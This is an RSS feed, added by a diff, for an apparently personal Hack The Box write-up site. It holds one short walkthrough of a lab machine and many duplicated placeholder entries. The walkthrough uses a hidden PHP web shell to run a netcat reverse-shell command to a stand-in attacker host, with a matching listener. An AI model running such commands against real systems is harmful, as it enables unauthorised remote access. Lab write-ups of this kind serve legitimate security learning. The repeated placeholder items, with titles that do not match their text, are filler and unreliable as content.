@@ -1,0 +1,180 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Writeups on shellthisbox</title>
+    <link>https://example.org/writeups/</link>
+    <description>Recent content in Writeups on shellthisbox</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 15 Jun 2025 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://example.org/writeups/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB Machine: Fluffy</title>
+      <link>https://example.org/writeups/fluffy/</link>
+      <pubDate>Sun, 15 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/fluffy/</guid>
+      <description>&lt;h2 id=&#34;-nmap-scan&#34;&gt;🛰️ Nmap Scan&lt;/h2&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -sV -A fluffy.htb&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;PORT     STATE SERVICE VERSION&#xA;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5&#xA;80/tcp   open  http    Apache httpd 2.4.41&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;-web-enumeration&#34;&gt;🕵️ Web Enumeration&lt;/h2&gt;&#xA;&lt;p&gt;Visiting &lt;code&gt;http://fluffy.htb&lt;/code&gt; gives a default Apache page. Directory brute-forcing reveals:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;/admin&#xA;/uploads&#xA;/robots.txt&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;robotstxt&#34;&gt;robots.txt&lt;/h3&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;User-agent: *&#xA;Disallow: /backdoor&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Accessing &lt;code&gt;/backdoor&lt;/code&gt; reveals a hidden PHP shell.&lt;/p&gt;&#xA;&lt;h2 id=&#34;-shell-access&#34;&gt;🧑‍💻 Shell Access&lt;/h2&gt;&#xA;&lt;p&gt;Using the PHP shell:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -X POST http://fluffy.htb/backdoor -d &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cmd=nc -e /bin/bash attacker-ip 4444&amp;#39;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Listener:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nc -lvnp &lt;span style=&#34;color:#ae81ff&#34;&gt;4444&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Shell gained!&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Blaaaa</title>
+      <link>https://example.org/writeups/machine-6/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-6/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Black</title>
+      <link>https://example.org/writeups/machine-4/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-4/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Blue</title>
+      <link>https://example.org/writeups/machine-1/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-1/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Orange</title>
+      <link>https://example.org/writeups/machine-2/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-2/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: purpule</title>
+      <link>https://example.org/writeups/machine-3/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-3/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-10/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-10/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-11/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-11/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-12/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-12/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-13/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-13/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-14/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-14/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-15/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-15/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-16/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-16/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-17/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-17/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-2/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-2/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-3/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-3/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-4/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-4/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-5/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-5/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-6/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-6/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-7/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-7/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-8/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-8/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy-9/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy-9/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5-copy/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5-copy/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>HTB Machine: Red</title>
+      <link>https://example.org/writeups/machine-5/</link>
+      <pubDate>Fri, 13 Jun 2025 00:00:00 +0000</pubDate>
+      <guid>https://example.org/writeups/machine-5/</guid>
+      <description>&lt;p&gt;Opis maszyny&amp;hellip;&#xA;Sample writeup content for HTB Machine Blue.&lt;/p&gt;</description>
+    </item>
+  </channel>
+</rss>
